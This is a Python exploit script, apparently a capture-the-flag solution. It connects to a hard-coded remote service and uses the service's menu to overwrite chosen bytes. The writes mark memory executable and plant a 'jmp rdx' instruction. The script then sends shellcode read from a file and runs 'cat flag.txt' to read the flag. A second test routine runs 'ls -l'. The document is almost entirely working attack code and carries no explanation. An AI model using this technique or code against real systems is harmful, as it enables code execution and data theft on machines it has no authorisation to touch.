#!/usr/bin/env python3

import socket


def readuntil(s,val):
	buf = b''
	while not buf.endswith(val):
		buf = buf + s.recv(BUFSIZE)
		print(buf)
		print(buf.decode('ascii'))

def sendall(s,buf):
	print('>>', buf)
	s.send(buf)

def pwn(s):

	# 0x1cc -> 0x07 (RWX)
	# FFE2 --> jmp rdx
	# 0x7ae (just after mov rdx, rsp)

	readuntil(s,b'? ')
	sendall(s,b'3\n')
	readuntil(s,b'? ')

	sendall(s,b'%d\n'%0x1cc)
	readuntil(s,b'? ')
	sendall(s,b'7\n')
	readuntil(s,b'? ')

	sendall(s,b'%d\n'%0x7ae)
	readuntil(s,b'? ')
	sendall(s,b'%d\n'%0xff)
	readuntil(s,b'? ')

	sendall(s,b'%d\n'%0x7af)
	readuntil(s,b'? ')
	sendall(s,b'%d\n'%0xe2)
	readuntil(s,b'==\n')

	sendall(s,shellcode+b'\n')
	sendall(s,b'cat flag.txt\n')
	readuntil(s,b'? ')

def test(s):

	# 0x1cc -> 0x07 (RWX)
	# FFE2 --> jmp rdx
	# 0x7ae (just after mov rdx, rsp)

	readuntil(s,b'? ')
	sendall(s,b'4\n')
	readuntil(s,b'? ')

	sendall(s,b'2246\n')
	readuntil(s,b'? ')
	sendall(s,b'114\n')
	readuntil(s,b'? ')

	sendall(s,b'2281\n')
	readuntil(s,b'? ')
	sendall(s,b'97\n')
	readuntil(s,b'? ')

	sendall(s,b'2297\n')
	readuntil(s,b'? ')
	sendall(s,b'32\n')
	readuntil(s,b'? ')

	sendall(s,b'2323\n')
	readuntil(s,b'? ')
	sendall(s,b'112\n')
	readuntil(s,b'==\n')

	#sendall(s,shellcode+b'\n')
	sendall(s,b'ls -l\n')
	#sendall(s,b'exit\n')
	#sendall(s,b'quit\n')
	readuntil(s,b'? ')

if __name__ == '__main__':

	shellcode = open('shellcode','rb').read()
	print('shellcode:',shellcode)

	BUFSIZE = 2048

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
	s.connect(('3.93.128.89',1206))

	#test(s)
	pwn(s)




